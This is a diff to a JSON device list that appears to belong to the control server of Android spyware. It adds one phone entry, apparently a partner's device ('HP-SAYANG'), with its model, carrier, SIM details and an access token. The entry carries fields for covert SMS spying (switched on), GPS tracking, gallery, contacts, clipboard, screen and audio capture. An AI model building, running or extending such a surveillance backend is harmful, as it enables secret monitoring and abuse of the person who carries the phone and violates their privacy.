@@ -159,5 +159,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "pxc_5f2b1c7f",
+    "deviceName": "HP-SAYANG-CF41",
+    "ownerUsername": "GANANG",
+    "token": "511c843889490f24a83fdf9ff1ebec0c",
+    "lastSeen": 1775629292558,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-08T06:21:32.558Z",
+    "deviceInfo": {
+      "model": "TECNO TECNO KM4",
+      "androidVersion": "Android 15",
+      "battery": 28,
+      "network": "Seluler: XL Axiata",
+      "sim1": "XL Axiata",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
